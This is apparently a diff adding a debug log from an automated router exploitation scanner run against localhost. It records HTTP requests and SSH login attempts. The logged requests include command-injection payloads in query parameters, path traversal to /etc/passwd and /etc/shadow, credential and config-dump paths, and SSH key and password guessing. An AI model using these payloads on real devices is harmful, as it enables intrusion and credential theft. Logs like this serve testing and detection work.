+2019-02-24 10:30:58,391 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:58,397 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,398 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /hedwig.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:58,403 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,405 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /getcfg.php?A=A%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d1 HTTP/1.1" 404 None
+2019-02-24 10:30:58,412 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,414 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,415 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:58,424 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,426 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /hedwig.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:58,431 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,433 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi-bin/webproc HTTP/1.1" 404 169
+2019-02-24 10:30:58,437 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,438 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,442 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:58,443 DEBUG paramiko.transport       starting thread (client mode): 0x9066cb38
+2019-02-24 10:30:58,450 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,450 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:58,452 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((157146-1));echo%20ffffffffffffffff; HTTP/1.1" 404 169
+2019-02-24 10:30:58,456 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:58,457 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:58,458 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:58,460 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /bsc_lan.php HTTP/1.1" 404 None
+2019-02-24 10:30:58,462 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:58,463 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:58,463 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:58,464 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:58,464 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:58,465 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:58,470 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,471 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,472 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,473 DEBUG paramiko.transport       Trying SSH key b'713ab018e26c41184e561efdd2499766'
+2019-02-24 10:30:58,514 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,534 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,537 DEBUG paramiko.transport       starting thread (client mode): 0x9066cef0
+2019-02-24 10:30:58,537 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:58,539 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:58,550 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:58,550 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:58,553 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:58,554 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:58,554 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:58,554 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:58,554 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:58,554 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:58,560 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,561 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,562 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,563 DEBUG paramiko.transport       Trying SSH key b'f09610b7d63838def4b4d2df5ef82d74'
+2019-02-24 10:30:58,607 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,621 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,626 DEBUG paramiko.transport       starting thread (client mode): 0x906754a8
+2019-02-24 10:30:58,626 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:58,635 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:58,638 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:58,639 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:58,642 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:58,643 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:58,643 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:58,643 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:58,644 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:58,644 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:58,649 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:58,650 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:58,651 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:58,652 DEBUG paramiko.transport       Trying SSH key b'049bf5dede27105ab88dab79cd17e857'
+2019-02-24 10:30:58,690 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:58,705 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:58,722 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:58,806 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:00,307 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,308 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /diag.html?images/ HTTP/1.1" 404 169
+2019-02-24 10:31:00,310 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,310 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard HTTP/1.1" 404 169
+2019-02-24 10:31:00,312 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,313 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd HTTP/1.1" 404 None
+2019-02-24 10:31:00,315 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,316 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /getcfg.php HTTP/1.1" 404 None
+2019-02-24 10:31:00,318 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,318 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /DataStore/990_user_account.js?index=0&pagesize=10 HTTP/1.1" 404 571
+2019-02-24 10:31:00,320 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,321 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /diagnostic.php HTTP/1.1" 404 None
+2019-02-24 10:31:00,323 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,323 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703 HTTP/1.1" 404 169
+2019-02-24 10:31:00,325 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,326 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /command.php HTTP/1.1" 404 None
+2019-02-24 10:31:00,328 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,328 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /HNAP1/ HTTP/1.1" 404 169
+2019-02-24 10:31:00,330 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,331 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ayefeaturesconvert.js HTTP/1.1" 404 169
+2019-02-24 10:31:00,332 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,333 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /setSystemCommand HTTP/1.1" 404 169
+2019-02-24 10:31:00,335 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,336 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /hidden_info.html HTTP/1.1" 404 169
+2019-02-24 10:31:00,338 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,339 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /apply.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:00,341 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,341 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page= HTTP/1.1" 404 169
+2019-02-24 10:31:00,343 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,344 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 173
+2019-02-24 10:31:00,345 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,346 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /userRpm/DebugResultRpm.htm?cmd=echo%2024Rqm79MrR9HesqhJAjVOfIuiytNsd2U&usr=osteam&passwd=5up HTTP/1.1" 404 169
+2019-02-24 10:31:00,348 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,348 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /config.bin HTTP/1.1" 404 169
+2019-02-24 10:31:00,351 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,351 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi?2 HTTP/1.1" 404 169
+2019-02-24 10:31:00,353 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,353 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /ping.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:00,355 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,356 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardData102.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20wVmcXIg1gl90XMQW7V4tuZFThviTLrju;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:31:00,358 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,359 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardData103.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20wVmcXIg1gl90XMQW7V4tuZFThviTLrju;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:31:00,361 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,362 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataNA.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20wVmcXIg1gl90XMQW7V4tuZFThviTLrju;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:31:00,364 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,365 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataWW.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20wVmcXIg1gl90XMQW7V4tuZFThviTLrju;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:31:00,367 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,368 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataJP.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20wVmcXIg1gl90XMQW7V4tuZFThviTLrju;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:31:00,370 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,372 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home HTTP/1.1" 404 169
+2019-02-24 10:31:00,374 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,375 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa HTTP/1.1" 404 169
+2019-02-24 10:31:00,378 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,380 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "HEAD / HTTP/1.1" 200 0
+2019-02-24 10:31:00,383 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,384 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /login_handler.php HTTP/1.1" 404 None
+2019-02-24 10:31:00,387 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,388 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:00,390 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,391 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:31:00,393 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,394 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi-bin/cgiSrv.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:00,396 DEBUG paramiko.transport       starting thread (client mode): 0x981132b0
+2019-02-24 10:31:00,397 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:00,403 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:00,403 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:00,405 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:00,405 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:00,406 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:00,406 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:00,406 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:00,406 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:00,450 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:00,450 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:00,451 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:00,496 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:00,506 INFO paramiko.transport       Authentication (password) failed.
+2019-02-24 10:31:00,508 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,508 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /shell?echo%20Gz0o9j0fIaZEViv4 HTTP/1.1" 404 169
+2019-02-24 10:31:00,510 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,510 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /../../../../../etc/passwd HTTP/1.1" 400 173
+2019-02-24 10:31:00,512 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,512 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /device.rsp?opt=user&cmd=list HTTP/1.1" 404 169
+2019-02-24 10:31:00,514 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,515 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /system.ini?loginuse&loginpas HTTP/1.1" 404 169
+2019-02-24 10:31:00,516 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,517 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /system.ini?loginuse&loginpas HTTP/1.1" 404 169
+2019-02-24 10:31:00,519 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,520 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET //etc/RT2870STA.dat HTTP/1.1" 404 169
+2019-02-24 10:31:00,521 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,522 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /get_status.cgi HTTP/1.1" 404 169
+2019-02-24 10:31:00,523 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,524 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/check.cgi?file=../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:00,525 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,526 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/chklogin.cgi?file=../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:00,527 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,528 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1" 404 169
+2019-02-24 10:31:00,529 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,530 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:00,532 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,532 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1" 404 169
+2019-02-24 10:31:00,534 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,535 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:31:00,536 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,537 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /frame/GetConfig HTTP/1.1" 404 169
+2019-02-24 10:31:00,539 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,540 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump?action=get HTTP/1.1" 404 169
+2019-02-24 10:31:00,541 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,542 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump.backup HTTP/1.1" 404 169
+2019-02-24 10:31:00,543 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,544 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump.gz HTTP/1.1" 404 169
+2019-02-24 10:31:00,546 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,546 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump HTTP/1.1" 404 169
+2019-02-24 10:31:00,548 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,548 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
+2019-02-24 10:31:00,550 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:31:00,551 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1" 404 169
